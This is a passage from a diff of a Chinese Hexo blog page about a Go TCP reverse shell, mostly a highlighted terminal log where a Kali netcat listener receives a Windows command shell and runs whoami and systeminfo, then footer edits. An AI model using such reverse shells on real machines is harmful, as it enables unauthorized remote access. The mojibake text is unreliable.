KB4528759</span><br><span class="line">                  [11]: KB4537759</span><br><span class="line">                  [12]: KB4538674</span><br><span class="line">                  [13]: KB4541338</span><br><span class="line">                  [14]: KB4541335</span><br><span class="line">����:             ��װ�� 8 �� NIC��</span><br><span class="line">                  [01]: VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet1</span><br><span class="line">                      ������:      VMware Network Adapter VMnet1</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      DHCP ������: 192.168.233.254</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.233.1</span><br><span class="line">                        [02]: fe80::9180:197a:ce35:69b8</span><br><span class="line">                  [02]: VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet8</span><br><span class="line">                      ������:      VMware Network Adapter VMnet8</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.66.1</span><br><span class="line">                        [02]: fe80::9d24:3f2d:1f79:94eb</span><br><span class="line">                  [03]: Intel(R) Wireless-AC 9462</span><br><span class="line">                      ������:      WLAN 2</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">                  [04]: Realtek PCIe GbE Family Controller</span><br><span class="line">                      ������:      ����</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.1.56</span><br><span class="line">                        [02]: fe80::b11f:6ef2:7ec6:6eb3</span><br><span class="line">                  [05]: Bluetooth Device (Personal Area Network)</span><br><span class="line">                      ������:      ������������</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">                  [06]: Microsoft KM-TEST Loopback Adapter</span><br><span class="line">                      ������:      Npcap Loopback Adapter</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      DHCP ������: 255.255.255.255</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 169.254.234.82</span><br><span class="line">                        [02]: fe80::40e5:86bd:7eba:ea52</span><br><span class="line">                  [07]: VirtualBox Host-Only Ethernet Adapter</span><br><span class="line">                      ������:      VirtualBox Host-Only Network</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.56.1</span><br><span class="line">                        [02]: fe80::9429:8e07:8ee2:d61d</span><br><span class="line">                  [08]: TAP-Windows Adapter V9</span><br><span class="line">                      ������:      ��������</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">Hyper-V Ҫ��:     ������������ģʽ��չ: ��</span><br><span class="line">                  �������������⻯: ��</span><br><span class="line">                  ������ת��: ��</span><br><span class="line">                  �����б�������: ��</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="cm9vdEBrYWxpOn4jIG5jIC1sdnAgNTU2NgpsaXN0ZW5pbmcgb24gW2FueV0gNTU2NiAuLi4KMTkyLjE2OC42Ni4xOiBpbnZlcnNlIGhvc3QgbG9va3VwIGZhaWxlZDogVW5rbm93biBob3N0CmNvbm5lY3QgdG8gWzE5Mi4xNjguNjYuNl0gZnJvbSAoVU5LTk9XTikgWzE5Mi4xNjguNjYuMV0gMjEzMjIKTWljcm9zb2Z0IFdpbmRvd3MgW++/veaxviAxMC4wLjE4MzYzLjc1Ml0KKGMpIDIwMTkgTWljcm9zb2Z0IENvcnBvcmF0aW9u77+977+977+977+977+977+977+977+977+977+9yKjvv73vv73vv73vv70KCkQ6XEdvXHRlc3Rnb2ZpbGVzXG9sZGJveWdvXGdvcHJvZ3JhbVxoYWNraW5nd2l0aGdvbGFuZ1xnb3JldmVyc2VzaGVsbD53aG9hbWkKd2hvYW1pCmx1Y2lmZXIxMVxoYXNlZQoKRDpcR29cdGVzdGdvZmlsZXNcb2xkYm95Z29cZ29wcm9ncmFtXGhhY2tpbmd3aXRoZ29sYW5nXGdvcmV2ZXJzZXNoZWxsPnN5c3RlbWluZm8Kc3lzdGVtaW5mbwoK77+977+977+977+977+977+9OiAgICAgICAgICAgTFVDSUZFUjExCk9TIO+/ve+/ve+/ve+/vTogICAgICAgICAgTWljcm9zb2Z0IFdpbmRvd3MgMTAg77+977+90rXvv73vv70KT1Mg77+95rG+OiAgICAgICAgICAxMC4wLjE4MzYzIO+/ve+/vcixIEJ1aWxkIDE4MzYzCk9TIO+/ve+/ve+/ve+/ve+/ve+/vTogICAgICAgIE1pY3Jvc29mdCBDb3Jwb3JhdGlvbgpPUyDvv73vv73vv73vv706ICAgICAgICAgIO+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/vdW+Ck9TIO+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/vTogICAgICBNdWx0aXByb2Nlc3NvciBGcmVlCtei77+977+977+977+977+977+977+977+977+977+9OiAgICAgSEFTRUUK16Lvv73vv73vv73vv73vv73vv706ICAgICAgIArvv73vv73GtyBJRDogICAgICAgICAgMDAzMjgtOTAwMDAtMDAwMDAtQUFPRU0K77+977+9yrzvv73vv73XsO+/ve+/ve+/ve+/vTogICAgIDIwMTkvOS8yMywgMTg6MDg6MTgKz7XNs++/ve+/ve+/ve+/vcqx77+977+9OiAgICAgMjAyMC80LzgsIDE1OjI4OjMzCs+1zbPvv73vv73vv73vv73vv73vv706ICAgICAgIEhBU0VFIENvbXB1dGVyCs+1zbPvv73Nuu+/vTogICAgICAgICBQQTcwRVMgICAgICAgICAgICAgICAgICAgICAgICAgCs+1zbPvv73vv73vv73vv706ICAgICAgICAgeDY0LWJhc2VkIFBDCu+/ve+/ve+/ve+/ve+/ve+/vTogICAgICAgICAgIO+/ve+/vdew77+977+9IDEg77+977+977+977+977+977+977+977+977+977+9CiAgICAgICAgICAgICAgICAgIFswMV06IEludGVsNjQgRmFtaWx5IDYgTW9kZWwgMTU4IFN0ZXBwaW5nIDEwIEdlbnVpbmVJbnRlbCB+MjIwMSBNaHoKQklPUyDvv73msb46ICAgICAgICBBbWVyaWNhbiBNZWdhdHJlbmRzIEluYy4gMS4wNy4xMFJIUzQsIDIwMTgvMTEvMTQKV2luZG93cyDEv8K8OiAgICAgQzpcV0lORE9XUwrPtc2zxL/CvDogICAgICAgICBDOlxXSU5ET1dTXHN5c3RlbTMyCu+/ve+/ve+/ve+/ve+/veixuDogICAgICAgICBcRGV2aWNlXEhhcmRkaXNrVm9sdW1lNArPtc2z77+977+977+977+977+977+977+977+9OiAgICAgemgtY24777+977+977+977+9KO+/vdC577+9KQrvv73vv73vv73rt6jvv73vv73vv73vv73vv73vv73vv73vv706ICAgemgtY24777+977+977+977+9KO+/vdC577+9KQrKse+/ve+/vTogICAgICAgICAgICAgKFVUQyswODowMCkg77+977+977+977+977+977+977+977+977+97KOs77+977+977+977+977+92LHvv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73Cs8S+77+977+9Cu+/ve+/ve+/ve+/ve+/vdq077+977+977+977+977+9OiAgICAgMTYsMjMxIE1CCu+/ve+/ve+/vcO177+977+977+977+977+977+92rTvv706ICAgNiwxMDQgTUIK77+977+977+977+977+92rTvv706IO+/ve+/ve+/ve+/vTogMTksMzAzIE1CCu+/ve+/ve+/ve+/ve+/vdq077+9OiDvv73vv73vv73vv706ICAgNCwzOTAgTUIK77+977+977+977+977+92rTvv706IMq577+977+977+977+9OiAxNCw5MTMgTUIK0rPvv73vv73vv73EvO+/vc6777+977+9OiAgICAgQzpccGFnZWZpbGUuc3lzCu+/ve+/vTogICAgICAgICAgICAgICBXT1JLR1JPVVAK77+977+9wrzvv73vv73vv73vv73vv73vv706ICAgICAgIFxcTFVDSUZFUjExCu+/vd6y77+977+977+977+977+9OiAgICAgICAgIO+/ve+/vdew77+977+9IDE0IO+/ve+/ve+/vd6y77+977+977+977+977+977+977+9CiAgICAgICAgICAgICAgICAgIFswMV06IEtCNDUzNzU3MgogICAgICAgICAgICAgICAgICBbMDJdOiBLQjQ1MTUzODMKICAgICAgICAgICAgICAgICAgWzAzXTogS0I0NTE2MTE1CiAgICAgICAgICAgICAgICAgIFswNF06IEtCNDUxNzI0NQogICAgICAgICAgICAgICAgICBbMDVdOiBLQjQ1MjAzOTAKICAgICAgICAgICAgICAgICAgWzA2XTogS0I0NTIxODYzCiAgICAgICAgICAgICAgICAgIFswN106IEtCNDUyNDI0NAogICAgICAgICAgICAgICAgICBbMDhdOiBLQjQ1MjQ1NjkKICAgICAgICAgICAgICAgICAgWzA5XTogS0I0NTI1NDE5CiAgICAgICAgICAgICAgICAgIFsxMF06IEtCNDUyODc1OQogICAgICAgICAgICAgICAgICBbMTFdOiBLQjQ1Mzc3NTkKICAgICAgICAgICAgICAgICAgWzEyXTogS0I0NTM4Njc0CiAgICAgICAgICAgICAgICAgIFsxM106IEtCNDU0MTMzOAogICAgICAgICAgICAgICAgICBbMTRdOiBLQjQ1NDEzMzUK77+977+977+977+9OiAgICAgICAgICAgICDvv73vv73XsO+/ve+/vSA4IO+/ve+/vSBOSUPvv73vv70KICAgICAgICAgICAgICAgICAgWzAxXTogVk13YXJlIFZpcnR1YWwgRXRoZXJuZXQgQWRhcHRlciBmb3IgVk1uZXQxCiAgICAgICAgICAgICAgICAgICAgICDvv73vv73vv73vv73vv73vv706ICAgICAgVk13YXJlIE5ldHdvcmsgQWRhcHRlciBWTW5ldDEKICAgICAgICAgICAgICAgICAgICAgIO+/ve+/ve+/ve+/vSBESENQOiAgIO+/ve+/vQogICAgICAgICAgICAgICAgICAgICAgREhDUCDvv73vv73vv73vv73vv73vv706IDE5Mi4xNjguMjMzLjI1NAogICAgICAgICAgICAgICAgICAgICAgSVAg77+977+9CiAgICAgICAgICAgICAgICAgICAgICAgIFswMV06IDE5Mi4xNjguMjMzLjEKICAgICAgICAgICAgICAgICAgICAgICAgWzAyXTogZmU4MDo6OTE4MDoxOTdhOmNlMzU6NjliOAogICAgICAgICAgICAgICAgICBbMDJdOiBWTXdhcmUgVmlydHVhbCBFdGhlcm5ldCBBZGFwdGVyIGZvciBWTW5ldDgKICAgICAgICAgICAgICAgICAgICAgIO+/ve+/ve+/ve+/ve+/ve+/vTogICAgICBWTXdhcmUgTmV0d29yayBBZGFwdGVyIFZNbmV0OAogICAgICAgICAgICAgICAgICAgICAg77+977+977+977+9IERIQ1A6ICAg77+977+9CiAgICAgICAgICAgICAgICAgICAgICBJUCDvv73vv70KICAgICAgICAgICAgICAgICAgICAgICAgWzAxXTogMTkyLjE2OC42Ni4xCiAgICAgICAgICAgICAgICAgICAgICAgIFswMl06IGZlODA6OjlkMjQ6M2YyZDoxZjc5Ojk0ZWIKICAgICAgICAgICAgICAgICAgWzAzXTogSW50ZWwoUikgV2lyZWxlc3MtQUMgOTQ2MgogICAgICAgICAgICAgICAgICAgICAg77+977+977+977+977+977+9OiAgICAgIFdMQU4gMgogICAgICAgICAgICAgICAgICAgICAg17Q6ICAgICAgICDDve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/vdC277+9CiAgICAgICAgICAgICAgICAgIFswNF06IFJlYWx0ZWsgUENJZSBHYkUgRmFtaWx5IENvbnRyb2xsZXIKICAgICAgICAgICAgICAgICAgICAgIO+/ve+/ve+/ve+/ve+/ve+/vTogICAgICDvv73vv73vv73vv70KICAgICAgICAgICAgICAgICAgICAgIO+/ve+/ve+/ve+/vSBESENQOiAgIO+/ve+/vQogICAgICAgICAgICAgICAgICAgICAgSVAg77+977+9CiAgICAgICAgICAgICAgICAgICAgICAgIFswMV06IDE5Mi4xNjguMS41NgogICAgICAgICAgICAgICAgICAgICAgICBbMDJdOiBmZTgwOjpiMTFmOjZlZjI6N2VjNjo2ZWIzCiAgICAgICAgICAgICAgICAgIFswNV06IEJsdWV0b290aCBEZXZpY2UgKFBlcnNvbmFsIEFyZWEgTmV0d29yaykKICAgICAgICAgICAgICAgICAgICAgIO+/ve+/ve+/ve+/ve+/ve+/vTogICAgICDvv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv70KICAgICAgICAgICAgICAgICAgICAgINe0OiAgICAgICAgw73vv73vv73vv73vv73vv73vv73vv73vv73vv73Qtu+/vQogICAgICAgICAgICAgICAgICBbMDZdOiBNaWNyb3NvZnQgS00tVEVTVCBMb29wYmFjayBBZGFwdGVyCiAgICAgICAgICAgICAgICAgICAgICDvv73vv73vv73vv73vv73vv706ICAgICAgTnBjYXAgTG9vcGJhY2sgQWRhcHRlcgogICAgICAgICAgICAgICAgICAgICAg77+977+977+977+9IERIQ1A6ICAg77+977+9CiAgICAgICAgICAgICAgICAgICAgICBESENQIO+/ve+/ve+/ve+/ve+/ve+/vTogMjU1LjI1NS4yNTUuMjU1CiAgICAgICAgICAgICAgICAgICAgICBJUCDvv73vv70KICAgICAgICAgICAgICAgICAgICAgICAgWzAxXTogMTY5LjI1NC4yMzQuODIKICAgICAgICAgICAgICAgICAgICAgICAgWzAyXTogZmU4MDo6NDBlNTo4NmJkOjdlYmE6ZWE1MgogICAgICAgICAgICAgICAgICBbMDddOiBWaXJ0dWFsQm94IEhvc3QtT25seSBFdGhlcm5ldCBBZGFwdGVyCiAgICAgICAgICAgICAgICAgICAgICDvv73vv73vv73vv73vv73vv706ICAgICAgVmlydHVhbEJveCBIb3N0LU9ubHkgTmV0d29yawogICAgICAgICAgICAgICAgICAgICAg77+977+977+977+9IERIQ1A6ICAg77+977+9CiAgICAgICAgICAgICAgICAgICAgICBJUCDvv73vv70KICAgICAgICAgICAgICAgICAgICAgICAgWzAxXTogMTkyLjE2OC41Ni4xCiAgICAgICAgICAgICAgICAgICAgICAgIFswMl06IGZlODA6Ojk0Mjk6OGUwNzo4ZWUyOmQ2MWQKICAgICAgICAgICAgICAgICAgWzA4XTogVEFQLVdpbmRvd3MgQWRhcHRlciBWOQogICAgICAgICAgICAgICAgICAgICAg77+977+977+977+977+977+9OiAgICAgIO+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/vQogICAgICAgICAgICAgICAgICAgICAg17Q6ICAgICAgICDDve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/vdC277+9Ckh5cGVyLVYg0qrvv73vv706ICAgICDvv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73Eo8q977+977+91bk6IO+/ve+/vQogICAgICAgICAgICAgICAgICDvv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73iu686IO+/ve+/vQogICAgICAgICAgICAgICAgICDvv73vv73vv73vv73vv73vv73Xqu+/ve+/vTog77+977+9CiAgICAgICAgICAgICAgICAgIO+/ve+/ve+/ve+/ve+/vdCx77+977+977+977+977+977+977+9OiDvv73vv70KCkQ6XEdvXHRlc3Rnb2ZpbGVzXG9sZGJveWdvXGdvcHJvZ3JhbVxoYWNraW5nd2l0aGdvbGFuZ1xnb3JldmVyc2VzaGVsbD4K"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.66.1: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.66.6] from (UNKNOWN) [192.168.66.1] 21322</span><br><span class="line">Microsoft Windows [�汾 10.0.18363.752]</span><br><span class="line">(c) 2019 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">lucifer11\hasee</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;systeminfo</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">������:           LUCIFER11</span><br><span class="line">OS ����:          Microsoft Windows 10 ��ҵ��</span><br><span class="line">OS �汾:          10.0.18363 ��ȱ Build 18363</span><br><span class="line">OS ������:        Microsoft Corporation</span><br><span class="line">OS ����:          ��������վ</span><br><span class="line">OS ��������:      Multiprocessor Free</span><br><span class="line">ע����������:     HASEE</span><br><span class="line">ע������:       </span><br><span class="line">��Ʒ ID:          00328-90000-00000-AAOEM</span><br><span class="line">��ʼ��װ����:     2019/9/23, 18:08:18</span><br><span class="line">ϵͳ����ʱ��:     2020/4/8, 15:28:33</span><br><span class="line">ϵͳ������:       HASEE Computer</span><br><span class="line">ϵͳ�ͺ�:         PA70ES                         </span><br><span class="line">ϵͳ����:         x64-based PC</span><br><span class="line">������:           ��װ�� 1 ����������</span><br><span class="line">                  [01]: Intel64 Family 6 Model 158 Stepping 10 GenuineIntel ~2201 Mhz</span><br><span class="line">BIOS �汾:        American Megatrends Inc. 1.07.10RHS4, 2018/11/14</span><br><span class="line">Windows Ŀ¼:     C:\WINDOWS</span><br><span class="line">ϵͳĿ¼:         C:\WINDOWS\system32</span><br><span class="line">�����豸:         \Device\HarddiskVolume4</span><br><span class="line">ϵͳ��������:     zh-cn;����(�й�)</span><br><span class="line">���뷨��������:   zh-cn;����(�й�)</span><br><span class="line">ʱ��:             (UTC+08:00) ���������죬�����ر�����������³ľ��</span><br><span class="line">�����ڴ�����:     16,231 MB</span><br><span class="line">���õ������ڴ�:   6,104 MB</span><br><span class="line">�����ڴ�: ����: 19,303 MB</span><br><span class="line">�����ڴ�: ����:   4,390 MB</span><br><span class="line">�����ڴ�: ʹ����: 14,913 MB</span><br><span class="line">ҳ���ļ�λ��:     C:\pagefile.sys</span><br><span class="line">��:               WORKGROUP</span><br><span class="line">��¼������:       \\LUCIFER11</span><br><span class="line">�޲�����:         ��װ�� 14 ���޲�������</span><br><span class="line">                  [01]: KB4537572</span><br><span class="line">                  [02]: KB4515383</span><br><span class="line">                  [03]: KB4516115</span><br><span class="line">                  [04]: KB4517245</span><br><span class="line">                  [05]: KB4520390</span><br><span class="line">                  [06]: KB4521863</span><br><span class="line">                  [07]: KB4524244</span><br><span class="line">                  [08]: KB4524569</span><br><span class="line">                  [09]: KB4525419</span><br><span class="line">                  [10]: KB4528759</span><br><span class="line">                  [11]: KB4537759</span><br><span class="line">                  [12]: KB4538674</span><br><span class="line">                  [13]: KB4541338</span><br><span class="line">                  [14]: KB4541335</span><br><span class="line">����:             ��װ�� 8 �� NIC��</span><br><span class="line">                  [01]: VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet1</span><br><span class="line">                      ������:      VMware Network Adapter VMnet1</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      DHCP ������: 192.168.233.254</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.233.1</span><br><span class="line">                        [02]: fe80::9180:197a:ce35:69b8</span><br><span class="line">                  [02]: VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet8</span><br><span class="line">                      ������:      VMware Network Adapter VMnet8</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.66.1</span><br><span class="line">                        [02]: fe80::9d24:3f2d:1f79:94eb</span><br><span class="line">                  [03]: Intel(R) Wireless-AC 9462</span><br><span class="line">                      ������:      WLAN 2</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">                  [04]: Realtek PCIe GbE Family Controller</span><br><span class="line">                      ������:      ����</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.1.56</span><br><span class="line">                        [02]: fe80::b11f:6ef2:7ec6:6eb3</span><br><span class="line">                  [05]: Bluetooth Device (Personal Area Network)</span><br><span class="line">                      ������:      ������������</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">                  [06]: Microsoft KM-TEST Loopback Adapter</span><br><span class="line">                      ������:      Npcap Loopback Adapter</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      DHCP ������: 255.255.255.255</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 169.254.234.82</span><br><span class="line">                        [02]: fe80::40e5:86bd:7eba:ea52</span><br><span class="line">                  [07]: VirtualBox Host-Only Ethernet Adapter</span><br><span class="line">                      ������:      VirtualBox Host-Only Network</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.56.1</span><br><span class="line">                        [02]: fe80::9429:8e07:8ee2:d61d</span><br><span class="line">                  [08]: TAP-Windows Adapter V9</span><br><span class="line">                      ������:      ��������</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">Hyper-V Ҫ��:     ������������ģʽ��չ: ��</span><br><span class="line">                  �������������⻯: ��</span><br><span class="line">                  ������ת��: ��</span><br><span class="line">                  �����б�������: ��</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><img src="https://raw.githubusercontent.com/FDlucifer/goreverseshell/master/showpics/exam2.jpg"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/FDlucifer/goreverseshell/master/showpics/exam2.jpg"></li>
 </ul>
 <h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
 <li>轻量级的golang tcp reverse shell</li>
@@ -373,16 +373,16 @@
           <div class="reward-container">
   <div>Buy me a coffee</div>
   <button>
-    Donate
+    赞赏
   </button>
   <div class="post-reward">
       <div>
-        <img src="/images/wechatpay.png" alt="253 WeChat Pay">
-        <span>WeChat Pay</span>
+        <img src="/images/wechatpay.png" alt="253 微信">
+        <span>微信</span>
       </div>
       <div>
-        <img src="/images/alipay.png" alt="253 Alipay">
-        <span>Alipay</span>
+        <img src="/images/alipay.png" alt="253 支付宝">
+        <span>支付宝</span>
       </div>
 
   </div>
@@ -393,20 +393,20 @@
 <div class="post-copyright">
 <ul>
   <li class="post-copyright-author">
-      <strong>Post author:  </strong>253
+      <strong>本文作者： </strong>253
   </li>
   <li class="post-copyright-link">
-      <strong>Post link: </strong>
+      <strong>本文链接：</strong>
       <a href="https://lucifer11.xyz/2020/04/09/goreverseshell/" title="goreverseshell---基于golang的tcp-reverseshell">https://lucifer11.xyz/2020/04/09/goreverseshell/</a>
   </li>
   <li class="post-copyright-license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
   </li>
 </ul>
 </div>
 
           <div class="followme">
-  <span>Welcome to my other publishing channels</span>
+  <span>欢迎关注我的其它发布渠道</span>
 
   <div class="social-list">
 
@@ -465,21 +465,22 @@
 </div>
 
           <div class="post-tags">
-              <a href="/tags/golang/" rel="tag"><i class="fa fa-tag"></i> golang</a>
-              <a href="/tags/penetration-tools/" rel="tag"><i class="fa fa-tag"></i> penetration tools</a>
+              <a href="/tags/Shell/" rel="tag"><i class="fa fa-tag"></i> Shell</a>
+              <a href="/tags/Go/" rel="tag"><i class="fa fa-tag"></i> Go</a>
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" rel="tag"><i class="fa fa-tag"></i> 网络编程</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2020/04/08/pluck-1/" rel="prev" title="vulnhub靶机渗透[pluck-1]">
-                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[pluck-1]
+                <a href="/2020/04/02/shellshock-exploitation/" rel="prev" title="shellshock漏洞运作原理分析及其利用">
+                  <i class="fa fa-chevron-left"></i> shellshock漏洞运作原理分析及其利用
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2020/04/09/SkyTower-1/" rel="next" title="vulnhub靶机渗透[SkyTower-1]">
-                  vulnhub靶机渗透[SkyTower-1] <i class="fa fa-chevron-right"></i>
+                <a href="/2020/04/11/gobindshell/" rel="next" title="gobindshell-Golang-Tcp-Bind-Shell">
+                  gobindshell-Golang-Tcp-Bind-Shell <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
@@ -512,15 +513,15 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-      <span>Word count total: </span>
-    <span title="Word count total">666k</span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">696k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-      <span>Reading time total &asymp;</span>
-    <span title="Reading time total">40:23</span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">42:11</span>
   </span>
 </div>
 <div class="busuanzi-count">
@@ -528,7 +529,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-user"></i>
       </span>
-      <span class="site-uv" title="Total Visitors">
+      <span class="site-uv" title="总访客量">
         <span id="busuanzi_value_site_uv"></span>
       </span>
     </span>
@@ -536,12 +537,12 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-eye"></i>
       </span>
-      <span class="site-pv" title="Total Views">
+      <span class="site-pv" title="总访问量">
         <span id="busuanzi_value_site_pv"></span>
       </span>
     </span>
 </div>
-  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span> 强力驱动
   </div>
 
     </div>
